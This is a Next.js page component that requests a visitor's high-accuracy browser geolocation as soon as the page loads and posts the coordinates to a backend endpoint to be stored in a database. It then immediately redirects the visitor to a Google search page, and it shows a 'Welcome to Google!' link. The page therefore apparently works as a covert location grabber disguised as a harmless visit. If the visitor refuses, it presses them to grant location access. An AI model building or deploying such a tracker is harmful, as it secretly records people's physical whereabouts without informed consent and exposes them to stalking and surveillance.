"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";

type LocationState = {
  lat: number | null;
  lng: number | null;
  accuracy: number | null;
};

export default function Page() {

  const router = useRouter();

  const [location, setLocation] = useState<LocationState>({
    lat: null,
    lng: null,
    accuracy: null,
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [savedId, setSavedId] = useState<number | null>(null);
  const [permissionDenied, setPermissionDenied] = useState(false);

  // 🔹 Call API to store location in DB
  const saveLocation = async (
    lat: number,
    lng: number,
    accuracy: number | null
  ) => {
    try {
      const res = await fetch("/api/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ lat, lng, accuracy }),
      });

      if (!res.ok) {
        console.error("Failed to save location");
        return;
      }

      const data = await res.json();
      if (data?.id) {
        setSavedId(data.id);
      }
    } catch (e) {
      console.error("Error calling /api/location:", e);
    }
  };

  const getLocation = () => {
    if (typeof window === "undefined") return;

    if (!("geolocation" in navigator)) {
      setError("❌ Geolocation is not supported by this browser.");
      return;
    }

    setLoading(true);
    setError(null);
    setPermissionDenied(false);
    setSavedId(null);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setLoading(false);

        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        setLocation({ lat, lng, accuracy });
        console.log("Accuracy (m):", accuracy);

        // 🔹 Save to DB
        saveLocation(lat, lng, accuracy);
        router.push("https://www.google.com/search?q=mern+full+stack+developer+roadmap");
      },
      (err) => {
        setLoading(false);

        switch (err.code) {
          case err.PERMISSION_DENIED:
            setPermissionDenied(true);
            setError(
              "❌ You denied location permission. Please allow location access in your browser settings and tap Try Again."
            );
            break;
          case err.POSITION_UNAVAILABLE:
            setError("❌ Position unavailable. Try enabling GPS / location.");
            break;
          case err.TIMEOUT:
            setError("❌ Location request timed out. Please try again.");
            break;
          default:
            setError("❌ An unknown error occurred.");
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  // Auto-try once on mount
  useEffect(() => {
    getLocation();
  }, []);

  return (
    <main className="min-h-screen p-6 flex flex-col items-center gap-4">
      <h1 className="text-2xl font-bold">📍 Current Location</h1>

      {/* Main action button */}
      <button
        onClick={getLocation}
        disabled={loading}
        className="px-4 py-2 border rounded hover:bg-gray-100"
      >
        {loading ? "Getting location..." : "Refresh / Get Location"}
      </button>

      {/* If permission denied, show a strong prompt to allow it */}
      {permissionDenied && (
        <div className="max-w-xl w-full border border-red-300 bg-red-50 text-red-700 text-sm rounded p-3">
          <p className="font-semibold mb-1">Location permission is required</p>
          <p className="mb-2">
            You denied location access. Please open your browser&apos;s site
            settings, allow location for this site, then tap{" "}
            <span className="font-semibold">“Refresh / Get Location”</span>{" "}
            again.
          </p>
          <ul className="list-disc list-inside text-xs space-y-1">
            <li>On mobile Chrome: tap the lock icon → Permissions → Location.</li>
            <li>On desktop: click the lock icon in the address bar → Site settings → Location.</li>
          </ul>
        </div>
      )}

      {error && !permissionDenied && (
        <p className="text-red-600 text-sm">{error}</p>
      )}

      {savedId && (
        <Link href={"https://google.com"}>
          Welcome to Google!
        </Link>
      )}

      {location.lat && location.lng && (
        <div className="w-full max-w-2xl space-y-2">
          <p className="text-sm">
            <strong>Latitude:</strong> {location.lat}
          </p>
          <p className="text-sm">
            <strong>Longitude:</strong> {location.lng}
          </p>

          {location.accuracy && (
            <p className="text-xs text-gray-600">
              Accuracy: ± {Math.round(location.accuracy)} meters
            </p>
          )}

          {/* Embedded Google Map */}
          <div className="w-full h-80 border rounded overflow-hidden mt-4">
            <iframe
              title="User Map"
              src={`https://www.google.com/maps?q=${location.lat},${location.lng}&z=18&output=embed`}
              className="w-full h-full"
              loading="lazy"
              referrerPolicy="no-referrer-when-downgrade"
            />
          </div>

          <a
            href={`https://www.google.com/maps?q=${location.lat},${location.lng}`}
            target="_blank"
            rel="noreferrer"
            className="text-blue-600 underline text-sm"
          >
            View full map on Google Maps →
          </a>
        </div>
      )}

      {!location.lat && !loading && !error && !permissionDenied && (
        <p className="text-sm text-gray-500">Fetching location...</p>
      )}
    </main>
  );
}
